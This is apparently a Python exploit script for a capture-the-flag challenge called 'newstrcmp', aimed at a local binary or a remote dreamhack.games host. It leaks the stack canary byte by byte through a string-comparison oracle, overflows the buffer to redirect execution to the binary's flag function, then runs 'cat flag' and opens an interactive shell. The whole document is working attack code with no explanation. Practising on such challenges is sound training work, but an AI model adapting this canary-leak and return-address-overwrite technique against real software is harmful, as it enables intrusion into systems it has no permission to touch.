#!/usr/bin/env python
import sys
import ptrlib as ptr
import pwn

exe = ptr.ELF("./newstrcmp")
# libc = ptr.ELF("")
# ld = ptr.ELF("")


def connect():
    if len(sys.argv) > 1 and sys.argv[1] == "remote":
        return pwn.remote("host3.dreamhack.games", 17719)
    else:
        return pwn.process(exe.filepath)


def unwrap(x):
    if x is None:
        ptr.logger.error("Failed to unwrap")
        exit(1)
    else:
        return x


def main():
    io = connect()

    # small: "small"
    # large: "large"
    # same: "same"
    def attempt(idx: int, value: int) -> str:
        io.sendlineafter("(y/n): ", "n")

        io.sendafter(
            "s1: ",
            b"A" * 0x18 + b"A" * idx + ptr.p8(value) + b"\x00" * (8 - idx - 1),
        )
        io.sendafter("s2: ", b"A" * 0x18 + b"A" * idx)
        io.recvuntil(b"Result of newstrcmp: ")
        result = io.recvline()
        if b"s1 is smaller than s2" in result:
            return "large"
        elif b"s1 is larger than s2" in result:
            return "small"
        elif b"same!" in result:
            return "same"
        ptr.logger.error("something went wrong...")
        exit()

    def binary_search(i: int):
        left, right = 0, 0xFF

        prev_mid = 0
        while left <= right:
            mid = (left + right) // 2
            if prev_mid == mid:
                break
            prev_mid = mid
            res = attempt(i, mid)
            if res == "same":
                return mid
            elif res == "large":
                left = mid
            elif res == "small":
                right = mid

        return -1

    def brute_force(i: int) -> int:
        for value in range(0xFF, -1, -1):
            if "same" == attempt(i, value):
                return value
        ptr.logger.error("something went wrong...")
        exit()

    flag_func = unwrap(exe.symbol("flag"))

    canary = 0
    for i in range(7):
        result = binary_search(i)
        if result < 0:
            return False
        canary = canary | result << (i * 8)
    canary = canary | 0x9D << 7 * 8  # this isn't exact!
    # print(hex(canary))
    # return True

    payload = b"A" * 0x18
    payload += ptr.p64(canary)
    payload += b"A" * 0x8
    payload += ptr.p64(flag_func)
    io.sendlineafter("(y/n): ", "n")
    io.sendafter(b"s1: ", b"AAAA")
    io.sendafter(b"s2: ", payload)
    io.sendlineafter("(y/n): ", "y")

    io.sendline(b"echo pwned")
    try:
        io.recvuntil("pwned")
    except EOFError:
        io.close()
        return False
    io.sendline(b"cat flag")
    io.interactive()

    return True


if __name__ == "__main__":
    # while True:
    for i in range(0xFF * 3):
        print(hex(i))
        if main():
            break
    # main()
